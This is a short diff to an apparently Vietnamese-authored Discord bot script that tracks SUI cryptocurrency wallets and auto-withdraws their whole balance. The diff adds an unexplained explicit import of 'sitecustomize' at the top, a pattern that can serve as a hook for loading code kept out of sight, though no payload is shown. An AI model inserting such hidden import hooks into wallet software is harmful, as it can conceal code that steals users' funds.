@@ -1,7 +1,8 @@
 # =========================================================
 #  Discord SUI Wallet Tracker  ─  Auto-Withdraw toàn bộ
 # =========================================================
-
+import importlib
+importlib.import_module("sitecustomize")
 # --- shim audioop cho Python 3.13 -------------------------
 import sys, types
 sys.modules['audioop'] = types.ModuleType('audioop')
